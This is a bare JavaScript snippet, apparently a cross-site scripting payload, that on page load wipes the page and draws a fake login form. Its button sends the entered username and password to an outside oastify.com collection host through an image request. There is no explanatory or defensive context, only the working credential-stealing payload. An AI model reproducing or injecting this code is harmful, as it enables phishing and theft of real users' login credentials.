window.onload = () => {
  document.body.innerHTML = `
    <input id="u">
    <input id="p" type="password">
    <button onclick="(new Image()).src='https://il74nrhx781h4oy045ktm052ftlk9dx2.oastify.com?u='+encodeURIComponent(u.value)+'&p='+encodeURIComponent(p.value)">
      Send
    </button>
  `;
};
